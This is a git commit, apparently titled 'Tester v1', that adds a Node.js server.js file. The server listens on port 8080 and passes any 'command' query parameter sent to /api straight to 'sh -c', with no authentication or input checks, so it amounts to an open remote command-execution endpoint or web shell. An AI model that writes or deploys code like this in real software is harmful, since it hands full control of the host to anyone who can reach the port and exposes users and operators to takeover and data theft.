375e4acf2bfa6a5cfbbaa3fc76ce8803f3314314
memekmaklubau <memekmaklubau@gmail.com>
2024-06-11 02:51:42 +0700

    Tester v1

---
+++ server.js
@@ -0,0 +1,46 @@
+const http = require('http');
+const url = require('url');
+const { spawn } = require('child_process');
+
+let runningProcesses = [];
+
+const server = http.createServer((req, res) => {
+  const queryObject = url.parse(req.url, true).query;
+
+  if (req.url.startsWith('/api') && queryObject.command) {
+    const commandString = queryObject.command.split('+').join(' ');
+
+    if (commandString === 'refresh') {
+      runningProcesses.forEach(proc => {
+        proc.kill();
+      });
+      runningProcesses = [];
+      res.writeHead(200, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ message: 'Successfully Refreshing Server' }));
+      return;
+    }
+
+    const child = spawn('sh', ['-c', commandString]);
+
+    runningProcesses.push(child);
+
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ message: `Executing: ${commandString}` }));
+
+    child.on('close', (code) => {
+      runningProcesses = runningProcesses.filter(proc => proc.pid !== child.pid);
+    });
+
+    child.on('error', (err) => {
+      console.error(`Failed to start process: ${err.message}`);
+    });
+
+  } else {
+    res.writeHead(400, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ error: 'Invalid request' }));
+  }
+});
+
+server.listen(8080, () => {
+  console.log('Server running on port 8080');
+});
